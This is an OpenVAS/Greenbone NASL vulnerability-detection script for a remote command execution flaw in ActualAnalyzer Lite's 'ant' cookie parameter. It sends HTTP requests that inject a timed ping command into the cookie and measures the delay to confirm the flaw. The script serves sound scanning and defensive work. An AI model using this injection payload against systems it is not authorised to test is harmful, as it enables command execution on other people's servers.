# SPDX-FileCopyrightText: 2014 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.804761");
  script_version("2023-07-26T05:05:09+0000");
  script_tag(name:"cvss_base", value:"7.8");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:N/A:N");
  script_tag(name:"last_modification", value:"2023-07-26 05:05:09 +0000 (Wed, 26 Jul 2023)");
  script_tag(name:"creation_date", value:"2014-09-03 13:22:44 +0530 (Wed, 03 Sep 2014)");
  script_name("ActualAnalyzer Lite 'ant' Cookie Parameter Remote Command Execution Vulnerability");

  script_tag(name:"summary", value:"ActualAnalyzer Lite is prone to a remote code execution (RCE) vulnerability.");

  script_tag(name:"vuldetect", value:"Send a crafted exploit string via HTTP GET request and check whether it is
  able to execute the code remotely.");

  script_tag(name:"insight", value:"Flaw exists because the 'ant' cookie parameter is not properly sanitized
  upon submission to the /aa.php script.");

  script_tag(name:"impact", value:"Successful exploitation will allow attacker to execute arbitrary code in the
  affected system.");

  script_tag(name:"affected", value:"ActualAnalyzer Lite version 2.81 and probably prior.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year
  since the disclosure of this vulnerability. Likely none will be provided anymore. General solution
  options are to upgrade to a newer release, disable respective features, remove the product or
  replace the product by another one.");

  script_tag(name:"solution_type", value:"WillNotFix");
  script_tag(name:"qod_type", value:"remote_analysis");
  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/34450");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2014 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("find_service.nasl", "no404.nasl", "webmirror.nasl", "DDI_Directory_Scanner.nasl", "os_detection.nasl", "global_settings.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("port_service_func.inc");
include("list_array_func.inc");
include("host_details.inc");
include("os_func.inc");

http_port = http_get_port(default:80);
if(!http_can_host_php(port:http_port)){
  exit(0);
}

host = http_host_name(port:http_port);

foreach dir (make_list_unique("/", "/actualanalyzer", "/statistics", "/lite", http_cgi_dirs(port:http_port)))
{

  if(dir == "/") dir = "";

  rcvRes = http_get_cache(item:string(dir, "/admin.php"),  port:http_port);

  if(">ActualAnalyzer Lite" >< rcvRes)
  {
    url = dir + '/aa.php?anp=' + get_host_name();

    if(os_host_runs("Windows") == "yes"){
      ping = "ping -n ";
      wait_extra_sec = 5;
    } else {
      ping = "ping -c ";
      wait_extra_sec = 7;
    }

    ## Added three times, to make sure its working properly
    sleep = make_list(3, 5, 7);

    ## Use sleep time to check we are able to execute command
    foreach sec (sleep)
    {
      sndReq = string("GET ", url, " HTTP/1.1\r\n",
                      "Host: ", host, "\r\n",
                      "Cookie: ant=", ping, sec, " 127.0.0.1; anm=414.`$cot`",
                      "\r\n\r\n");

      ## Now check how much time it's taking to execute
      start = unixtime();
      rcvRes = http_keepalive_send_recv(port:http_port, data:sndReq, bodyonly:FALSE);
      stop = unixtime();

      time_taken = stop - start;

      ## Time taken is always 1 less than the sec
      ## So i am adding 1 to it
      time_taken = time_taken + 1;

      if(time_taken + 1 < sec || time_taken > (sec + wait_extra_sec)) exit(0);
    }
    security_message(port:http_port);
    exit(0);
  }
}

exit(99);
